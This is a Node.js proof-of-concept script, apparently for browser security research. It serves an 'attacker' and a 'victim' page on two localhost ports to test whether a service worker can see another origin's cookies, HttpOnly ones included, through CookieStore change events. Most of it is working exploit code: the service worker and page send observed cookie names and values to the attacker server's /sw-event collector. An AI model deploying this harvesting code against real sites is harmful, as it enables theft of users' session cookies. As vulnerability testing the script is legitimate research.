#!/usr/bin/env node
// CookieStore Cross-Origin Cookie Event Leak — Two-Port Edition
// sn0x
//
// No /etc/hosts needed. localhost:9001 = attacker, localhost:9002 = victim.
// Two different ports = two different origins (same host, different port = different origin).
// Tests: does SW at origin A get CookieStore change events for cookies set by origin B?
//
// Usage: node server_twoport.js
// Open: http://localhost:9001/  in Chromium/Firefox

"use strict";
const http   = require("node:http");
const crypto = require("node:crypto");

const ATTACKER_PORT = 9001;
const VICTIM_PORT   = 9002;
const HOST          = "localhost";
const ATTACKER_ORIGIN = `http://${HOST}:${ATTACKER_PORT}`;
const VICTIM_ORIGIN   = `http://${HOST}:${VICTIM_PORT}`;

const events = [];
let eventSeq = 0;

function ts() { return new Date().toISOString(); }
function L(m) { process.stdout.write(`[${ts().slice(11,23)}] ${m}\n`); }

// ─── ANALYSIS ────────────────────────────────────────────────────────────────
function analyzeEvent(ev) {
  const bugs = [];
  for (const c of (ev.changed || [])) {
    if (c.name === 'victim_port_only') {
      bugs.push({ severity: 'HIGH', scenario: 1,
        desc: `Cross-origin cookie event: victim's port-only cookie "${c.name}"="${c.value}" visible to attacker SW`,
        impact: 'Cookie value crosses origin boundary (different port = different origin)' });
    }
    if (c.name === 'victim_httponly') {
      bugs.push({ severity: 'CRITICAL', scenario: 2,
        desc: `HttpOnly cookie "${c.name}" ${c.value ? 'WITH VALUE "'+c.value+'"' : '(name only)'} in SW event`,
        impact: 'HttpOnly cookies must be invisible to ALL JS — this is a security boundary violation' });
    }
    if (c.name === 'victim_httponly_b') {
      bugs.push({ severity: 'CRITICAL', scenario: '2b',
        desc: `HttpOnly server-set cookie "${c.name}" ${c.value ? 'value="'+c.value+'"' : '(name only)'} in event`,
        impact: 'HttpOnly flag bypassed via CookieStore change event' });
    }
    if (c.name === 'victim_shared_domain') {
      bugs.push({ severity: 'INFO', scenario: 3,
        desc: `Shared-domain cookie "${c.name}" in event — expected behavior`, impact: 'Baseline' });
    }
    if (c.name === 'victim_secure_cookie') {
      bugs.push({ severity: 'MEDIUM', scenario: 4,
        desc: `Secure cookie "${c.name}"="${c.value}" from victim origin visible in attacker SW`,
        impact: 'Secure-scoped cross-origin cookie observable' });
    }
  }
  for (const c of (ev.deleted || [])) {
    if (c.name === 'victim_port_only') {
      bugs.push({ severity: 'HIGH', scenario: '1-del',
        desc: `DELETE event for victim's port-only cookie observed at attacker SW`,
        impact: 'Cross-origin cookie lifecycle observable' });
    }
  }
  return bugs;
}

// ─── SERVICE WORKER CODE ─────────────────────────────────────────────────────
const swCode = `
const REPORT = '${ATTACKER_ORIGIN}/sw-event';

self.addEventListener('message', e => {
  if (e.data && e.data.type === 'SKIP_WAITING') self.skipWaiting();
});
self.addEventListener('activate', e => { e.waitUntil(clients.claim()); });
self.addEventListener('install',  e => { self.skipWaiting(); });

// The core test: does this fire for cookies set by ${VICTIM_ORIGIN}?
self.addEventListener('cookiechange', event => {
  const payload = {
    seq: Date.now(),
    type: 'sw-cookiechange',
    swOrigin: self.location.origin,
    swScope: self.registration.scope,
    changed: (event.changed || []).map(c => ({
      name: c.name,
      value: c.value,           // HttpOnly cookies SHOULD NOT have a value here
      domain: c.domain,
      path: c.path,
      secure: c.secure,
      sameSite: c.sameSite,
      httpOnly: c.httpOnly,     // Will this field even exist for HttpOnly?
    })),
    deleted: (event.deleted || []).map(c => ({
      name: c.name,
      domain: c.domain,
      path: c.path,
      httpOnly: c.httpOnly,
    })),
    ts: new Date().toISOString(),
  };

  console.log('[CookieStore-SW] event:', JSON.stringify(payload));

  fetch(REPORT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  }).catch(err => console.error('[CookieStore-SW] report failed:', err.message));

  clients.matchAll({ includeUncontrolled: true }).then(cs =>
    cs.forEach(c => c.postMessage({ type: 'COOKIE_EVENT', payload }))
  );
});

// Also test CookieStore.getAll() — what does the SW SEE?
async function dumpAllCookies(label) {
  try {
    const all = await cookieStore.getAll();
    const summary = all.map(c => ({ name: c.name, value: c.value, domain: c.domain }));
    fetch(REPORT + '?type=getall&label=' + encodeURIComponent(label), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type: 'cookiestore-getall', label, cookies: summary }),
    }).catch(() => {});
  } catch(e) {
    console.log('[SW] cookieStore.getAll failed:', e.message);
  }
}

self.addEventListener('fetch', e => {
  if (e.request.url.includes('/dump-sw-cookies')) {
    e.respondWith(
      cookieStore.getAll().then(all =>
        new Response(JSON.stringify({ sw_cookies: all }), {
          headers: { 'Content-Type': 'application/json',
                     'Access-Control-Allow-Origin': '*' }
        })
      ).catch(err => new Response(JSON.stringify({ error: err.message }), {
        headers: { 'Content-Type': 'application/json',
                   'Access-Control-Allow-Origin': '*' }
      }))
    );
    return;
  }
});
`;

// ─── ATTACKER PAGE ────────────────────────────────────────────────────────────
const attackerHtml = `<!doctype html>
<meta charset="utf-8">
<title>CookieStore Cross-Origin Leak PoC</title>
<style>
body { font: 13px/1.5 monospace; background: #0d0d0d; color: #ccc; margin: 20px; max-width: 960px; }
h1 { color: #ff6; font-size: 15px; }
h2 { color: #09f; font-size: 13px; margin: 16px 0 6px; }
.ok { color: #0f0; } .crit { color: #f33; font-weight: bold; } .warn { color: #ff0; }
.info { color: #09f; } .raw { color: #aaa; }
#log, #events { white-space: pre-wrap; border: 1px solid #333; padding: 8px; min-height: 40px; font-size: 12px; }
#findings { border: 2px solid #f33; padding: 10px; min-height: 20px; display: none; }
button { background:#1a1a1a; color: #09f; border:1px solid #09f; padding:4px 10px; cursor:pointer; margin:2px; }
.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
</style>
<h1>CookieStore Cross-Origin Cookie Event Leak PoC — sn0x</h1>
<p>Attacker: <strong>${ATTACKER_ORIGIN}</strong> | Victim: <strong>${VICTIM_ORIGIN}</strong></p>

<div class="grid">
<div>
<h2>Status</h2>
<div id="log">Initializing...</div>
</div>
<div>
<h2>FINDINGS (Bugs)</h2>
<div id="findings"></div>
</div>
</div>

<h2>Cookie Events Received by Attacker SW <button onclick="pollEvents()">Refresh</button> <button onclick="dumpSWCookies()">Dump SW cookieStore.getAll()</button></h2>
<div id="events">No events yet...</div>

<h2>Victim iframe (${VICTIM_ORIGIN}/set)</h2>
<iframe id="victim-frame" style="width:100%;height:160px;border:1px solid #333;background:#111" src="about:blank"></iframe>

<script>
const LOG    = document.getElementById('log');
const EVENTS = document.getElementById('events');
const FINDINGS = document.getElementById('findings');
const VICTIM  = '${VICTIM_ORIGIN}';
const ATTACKER = '${ATTACKER_ORIGIN}';
let pollTimer;
let lastEventCount = 0;

function log(msg, cls='') {
  const t = new Date().toISOString().slice(11,19);
  LOG.innerHTML += '<span class="' + cls + '">[' + t + '] ' + msg + '</span>\\n';
  LOG.scrollTop = LOG.scrollHeight;
}
function logOk(m)   { log(m,'ok');   }
function logWarn(m) { log(m,'warn'); }
function logCrit(m) { log(m,'crit'); }
function logInfo(m) { log(m,'info'); }

async function pollEvents() {
  const r = await fetch(ATTACKER + '/events');
  const data = await r.json();
  const evts = data.events || [];

  if (evts.length === 0) {
    EVENTS.innerHTML = '<span class="raw">No cookie events received yet.</span>';
    return;
  }

  EVENTS.innerHTML = '';
  let bugCount = 0;
  for (const ev of evts) {
    const bugs = ev.bugs || [];
    const cls  = bugs.some(b => b.severity === 'CRITICAL') ? 'crit' :
                 bugs.some(b => b.severity === 'HIGH')     ? 'warn' : 'raw';
    EVENTS.innerHTML += '<span class="' + cls + '">' +
      JSON.stringify(ev, null, 2) + '</span>\\n\\n';

    for (const bug of bugs) {
      bugCount++;
      showFinding(bug);
    }
  }

  if (evts.length > lastEventCount) {
    lastEventCount = evts.length;
    logInfo('Events updated: ' + evts.length + ' total, ' + bugCount + ' findings');
  }
}

function showFinding(bug) {
  FINDINGS.style.display = 'block';
  const cls = bug.severity === 'CRITICAL' ? 'crit' : bug.severity === 'HIGH' ? 'warn' : 'info';
  FINDINGS.innerHTML += '<div class="' + cls + '">⚠ [' + bug.severity + '] Scenario ' + bug.scenario + ':\\n' +
    bug.desc + '\\nImpact: ' + bug.impact + '</div>\\n';
}

async function dumpSWCookies() {
  const reg = await navigator.serviceWorker.getRegistration('/');
  if (!reg || !reg.active) { logWarn('No active SW'); return; }
  logInfo('Requesting SW to dump cookieStore.getAll()...');
  const r = await fetch('/dump-sw-cookies');
  const d = await r.json();
  logInfo('SW sees cookies: ' + JSON.stringify(d.sw_cookies || d));
}

async function registerSW() {
  if (!('serviceWorker' in navigator)) {
    logWarn('ServiceWorker not available — use Chrome/Firefox with SW support');
    return false;
  }
  logInfo('Registering service worker...');
  try {
    // Unregister any existing SW to ensure fresh state
    const existing = await navigator.serviceWorker.getRegistrations();
    for (const r of existing) { await r.unregister(); logInfo('Unregistered old SW'); }

    const reg = await navigator.serviceWorker.register('/sw.js', {
      scope: '/',
      updateViaCache: 'none',
    });

    await navigator.serviceWorker.ready;
    logOk('SW registered and active. Scope: ' + reg.scope);

    // Check if CookieStoreManager is available
    if (reg.cookies) {
      logOk('CookieStoreManager available (Firefox/Chrome 87+)');
      const subs = await reg.cookies.getSubscriptions();
      if (subs.length === 0) {
        await reg.cookies.subscribe([{ name: undefined }]);
        logOk('Subscribed to ALL cookie changes in SW scope');
      } else {
        logInfo('Already subscribed: ' + JSON.stringify(subs));
      }
    } else {
      logWarn('CookieStoreManager not available — SW cookiechange events may still fire automatically');
    }

    // Also listen for direct cookieStore changes on the document
    if (window.cookieStore) {
      cookieStore.addEventListener('change', ev => {
        const payload = {
          type: 'document-cookiestore-change',
          changed: (ev.changed||[]).map(c=>({name:c.name,value:c.value,domain:c.domain})),
          deleted: (ev.deleted||[]).map(c=>({name:c.name})),
          ts: new Date().toISOString(),
        };
        logWarn('Document cookieStore change: ' + JSON.stringify(payload));
        fetch(ATTACKER + '/sw-event?type=doc', {
          method:'POST',headers:{'Content-Type':'application/json'},
          body: JSON.stringify(payload),
        }).catch(()=>{});
      });
      logOk('Also listening for document-level cookieStore events');
    }

    // Listen for messages from SW
    navigator.serviceWorker.addEventListener('message', e => {
      if (e.data && e.data.type === 'COOKIE_EVENT') {
        const payload = e.data.payload;
        logCrit('SW RELAYED EVENT: ' + JSON.stringify(payload));
        pollEvents();
      }
    });

    return true;
  } catch (e) {
    logWarn('SW registration failed: ' + e.name + ': ' + e.message);
    logWarn('Ensure page is served over HTTP (not file://) from localhost');
    return false;
  }
}

async function triggerVictimCookies() {
  logInfo('Loading victim origin in iframe...');
  document.getElementById('victim-frame').src = VICTIM + '/set';
  logInfo('Victim iframe loaded — cookies being set at ' + VICTIM);
  logInfo('Polling for events every 1s...');
  pollTimer = setInterval(pollEvents, 1000);
  setTimeout(() => {
    clearInterval(pollTimer);
    logInfo('Polling stopped after 30s. Check events panel.');
  }, 30000);
}

// Also test direct JS cookie setting from this page
async function testLocalCookies() {
  logInfo('Setting test cookies on attacker origin...');
  document.cookie = 'attacker_own=TEST_OWN_VALUE; Path=/; SameSite=Lax';
  logInfo('Set: attacker_own — SW SHOULD see this one');
}

async function main() {
  log('=== CookieStore Cross-Origin Leak PoC ===', 'info');
  log('Attacker: ' + location.origin, 'info');
  log('Victim: ' + VICTIM, 'info');
  log('');

  const swOk = await registerSW();
  if (!swOk) return;

  // Small delay for SW to activate
  await new Promise(r => setTimeout(r, 800));

  await testLocalCookies();
  await new Promise(r => setTimeout(r, 200));

  await triggerVictimCookies();
}

main();
</script>`;

// ─── VICTIM PAGE ──────────────────────────────────────────────────────────────
const victimHtml = `<!doctype html>
<meta charset="utf-8">
<title>Victim Page (${VICTIM_ORIGIN})</title>
<style>body{font:12px monospace;background:#1a0a0a;color:#faa;padding:12px}</style>
<h4>Victim (${VICTIM_ORIGIN}) — setting cookies</h4>
<div id="log"></div>
<script>
const L = (m,c='') => { document.getElementById('log').innerHTML += '<div style="color:'+c+'">'+m+'</div>'; };

async function setAllCookies() {
  // Scenario 1: port-only cookie (no domain attr) — should be ONLY for this port/origin
  document.cookie = 'victim_port_only=SECRET_FROM_VICTIM_PORT; Path=/; SameSite=Lax';
  L('Set: victim_port_only (port-only — attacker SW should NOT see this)', '#f88');

  // Scenario 3: secure cookie (non-httponly)
  // Can't set Secure on localhost HTTP — skip

  // Scenario: a generic non-httponly cookie
  document.cookie = 'victim_secure_cookie=VICTIM_SESSION_VALUE; Path=/; SameSite=Lax';
  L('Set: victim_secure_cookie (non-httponly, victim port)', '#f88');

  await new Promise(r => setTimeout(r, 200));

  // Scenario 2: HttpOnly — must be set by server
  L('Fetching server to set HttpOnly cookies...', '#fa8');
  try {
    const r = await fetch('${VICTIM_ORIGIN}/set-httponly', { credentials: 'include' });
    const t = await r.text();
    L('Server HttpOnly set: ' + t, '#8f8');
  } catch(e) {
    L('HttpOnly fetch error: ' + e.message, '#f44');
  }

  L('Done. Check attacker events at ${ATTACKER_ORIGIN}/events', '#8f8');
}

setAllCookies();
</script>`;

// ─── SERVERS ─────────────────────────────────────────────────────────────────
function respond(res, status, body, type="text/plain", extra={}) {
  res.writeHead(status, { "Content-Type": type, "Cache-Control": "no-store",
    "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "*", ...extra });
  res.end(body);
}

function collectBody(req) {
  return new Promise(res => { let b=""; req.setEncoding("utf8"); req.on("data",d=>b+=d); req.on("end",()=>res(b)); });
}

// Attacker server (port 9001)
const attackerServer = http.createServer(async (req, res) => {
  const u = new URL(req.url, ATTACKER_ORIGIN);
  if (req.method === "OPTIONS") { respond(res, 204, ""); return; }

  if (u.pathname === "/" && req.method === "GET")
    { respond(res, 200, attackerHtml, "text/html; charset=utf-8"); return; }

  if (u.pathname === "/sw.js")
    { respond(res, 200, swCode, "application/javascript", { "Service-Worker-Allowed": "/" }); return; }

  if (u.pathname === "/sw-event" && req.method === "POST") {
    const body = await collectBody(req);
    try {
      const ev = JSON.parse(body);
      ev.receivedAt = ts();
      ev.source = u.searchParams.get("type") || "sw";
      ev.bugs = analyzeEvent(ev);
      events.push(ev);
      // Log findings
      if (ev.bugs.length) {
        for (const b of ev.bugs) {
          L(`*** [${b.severity}] Scenario ${b.scenario}: ${b.desc}`);
        }
      } else {
        L(`Event received (no findings): ${JSON.stringify(ev.changed||ev.deleted||[]).slice(0,120)}`);
      }
    } catch(e) {}
    respond(res, 204, ""); return;
  }

  if (u.pathname === "/events")
    { respond(res, 200, JSON.stringify({ count: events.length, events }), "application/json"); return; }

  if (u.pathname === "/reset" && req.method === "POST")
    { events.length = 0; respond(res, 200, "reset\n"); return; }

  if (u.pathname === "/dump-sw-cookies")
    { respond(res, 200, JSON.stringify({ note: "see sw.js fetch handler" }), "application/json"); return; }

  respond(res, 404, "not found\n");
});

// Victim server (port 9002)
const victimServer = http.createServer(async (req, res) => {
  const u = new URL(req.url, VICTIM_ORIGIN);
  if (req.method === "OPTIONS") { respond(res, 204, ""); return; }

  if (u.pathname === "/set")
    { respond(res, 200, victimHtml, "text/html; charset=utf-8"); return; }

  if (u.pathname === "/set-httponly") {
    res.writeHead(200, {
      "Content-Type": "text/plain",
      "Set-Cookie": [
        "victim_httponly=HTTPONLY_SECRET_VALUE; Path=/; HttpOnly; SameSite=Lax",
        "victim_httponly_b=HTTPONLY_B_SECRET; Path=/; HttpOnly; SameSite=Lax",
      ],
      "Access-Control-Allow-Origin": ATTACKER_ORIGIN,
      "Access-Control-Allow-Credentials": "true",
    });
    res.end("set httponly cookies\n");
    L(`Victim: Set HttpOnly cookies via Set-Cookie header`);
    return;
  }

  if (u.pathname === "/" && req.method === "GET")
    { respond(res, 200, victimHtml, "text/html; charset=utf-8"); return; }

  respond(res, 404, "not found\n");
});

attackerServer.listen(ATTACKER_PORT, HOST, () => {
  L(`Attacker server: ${ATTACKER_ORIGIN}`);
  L(`Victim  server: ${VICTIM_ORIGIN}/set`);
  L(`Events:         ${ATTACKER_ORIGIN}/events`);
  L(`SW code at:     ${ATTACKER_ORIGIN}/sw.js`);
  L(``);
  L(`Open in Firefox/Chrome: ${ATTACKER_ORIGIN}/`);
});
victimServer.listen(VICTIM_PORT, HOST, () => {
  L(`Victim server listening on port ${VICTIM_PORT}`);
});
